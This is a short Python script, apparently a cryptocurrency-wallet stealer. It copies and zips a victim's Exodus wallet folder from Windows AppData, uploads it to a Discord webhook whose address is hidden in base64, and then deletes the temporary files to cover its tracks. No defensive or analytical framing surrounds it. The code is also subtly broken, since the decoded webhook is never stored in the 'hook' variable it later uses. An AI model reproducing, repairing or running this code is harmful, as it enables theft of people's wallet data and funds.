import os.path, shutil, requests
import base64

def runner():
    user = os.path.expanduser("~")

    base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc2Mjg2OTI4NTM3MjA1NS9kZzgwcmo0b0tUNDVlQU5xVWVUaWl6eXlZRjYzdkxJaGtxNzJ6YXBkVjRYNlNRUW9GTVdyNTEyb1pDWjg1WnIydmlnRQ==").decode()
    if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
     shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
     shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

     file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
     r = requests.post(hook, files=file)
     try:
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
     except:
       pass
